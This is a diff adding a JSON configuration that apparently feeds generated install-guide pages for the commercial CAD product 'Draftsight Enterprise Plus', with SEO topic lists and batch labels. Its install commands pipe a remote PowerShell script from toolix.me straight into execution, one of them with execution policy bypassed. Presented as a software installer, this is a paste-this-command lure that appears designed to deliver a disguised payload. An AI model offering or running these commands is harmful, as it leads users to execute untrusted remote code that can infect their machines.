@@ -1,0 +1,27 @@
+{
+  "repo": "Draftsight-Enterprise-Plus-CAD-Business",
+  "product": "Draftsight Enterprise Plus CAD Business",
+  "product_title": "Draftsight Enterprise Plus CAD Business",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-draftsight-enterprise-cad-business",
+    "draftsight-enterprise-cad-business-app",
+    "creative-workflow",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "draftsight-enterprise-cad-business-windows-tool",
+    "draftsight-enterprise-cad-business-modeling-tool",
+    "draftsight-enterprise-cad-business",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
